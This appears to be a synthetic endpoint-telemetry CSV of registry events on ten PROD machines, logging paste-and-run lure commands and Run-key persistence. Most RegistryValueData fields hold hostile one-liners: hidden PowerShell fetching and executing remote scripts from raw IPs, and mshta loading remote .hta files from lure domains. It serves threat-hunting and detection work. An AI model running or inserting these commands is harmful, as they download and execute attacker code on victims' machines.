Timestamp,DeviceId,DeviceName,ActionType,RegistryKey,RegistryValueName,RegistryValueData,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-01T19:18:37.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2001\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -W Hidden -NonInteractive -Ep Bypass -c ""iex((New-Object Net.WebClient).DownloadStrin",explorer.exe,5110,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,f52b945b991568bb250a28ff033ff5ad
2026-02-02T18:40:05.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2002\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,powershell.exe -WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAc,explorer.exe,5348,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,6fb360cb39ad5f136fae71d0f63f6799
2026-02-03T18:25:07.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2003\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -w hidden -nop -ep bypass -c ""irm https://179.43.167.55/stage1 | iex""",explorer.exe,5676,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,e35afaf42ef307d2601ae013b05c09d4
2026-02-04T20:56:12.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2004\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -W Hidden -c ""IEX(iwr -UseBasicParsing https://212.193.30.21/ldr.ps1)""",explorer.exe,6018,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,d2592a3443f59bb05129c8f12ca50c79
2026-02-05T19:16:01.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2005\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,mshta.exe https://fake-browser-update.store/update.hta,explorer.exe,6276,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,90eb6b4f183325a1abf5bc08c13df8a4
2026-02-06T21:12:28.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2006\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,"mshta.exe ""javascript:b=new ActiveXObject('WScript.Shell');b.Run('powershell -w hidden -c iex(iwr ht",explorer.exe,6407,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,49edbc8ee3e621616373a1549a26e50b
2026-02-07T20:55:37.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2007\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,mshta.exe https://cdn-verify.live/check.hta,explorer.exe,6648,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,88fd04fa2570410c2907eba2cf1e1c48
2026-02-18T01:56:48.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,UpdateHelper,mshta.exe https://77.91.68.20/run.hta,powershell.exe,9930,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,43e4032303f446e893b0ba6f4ca75ca3
2026-02-19T00:53:31.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,SvcMonitor,mshta.exe https://45.141.87.30/load.hta,powershell.exe,10044,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,0c66e9590f0b28895eed91cc4edf95ae
2026-02-19T23:29:07.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,NetDiag,mshta.exe https://179.43.167.55/exec.hta,powershell.exe,10154,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,b21e4612c0412d061a0214cfbf32c4b8
